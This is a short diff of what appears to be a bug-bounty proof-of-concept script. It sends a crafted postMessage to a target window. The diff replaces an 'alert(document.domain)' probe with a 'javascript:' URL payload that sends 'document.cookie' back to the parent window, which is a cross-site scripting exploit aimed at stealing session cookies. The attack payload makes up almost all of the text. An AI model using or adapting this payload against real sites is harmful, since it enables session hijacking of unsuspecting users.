@@ -24,7 +24,7 @@ var data = JSON.stringify({"message":{"type":13}});
 			}
 
 function sendMessage1(){
-var data = JSON.stringify({"message":{"type":3,"noVerify":1,"subsid":1,"src":"javascript:alert(document.domain);//","captype":1,"subcaptype":1}});
+var data = JSON.stringify({"message":{"type":3,"noVerify":1,"subsid":1,"src":"javascript:window.parent.postMessage(document.cookie,*);//","captype":1,"subcaptype":1}});
 	h1Win.postMessage(data,"*");
         console.log("postmessage successed for customer!")
 			}
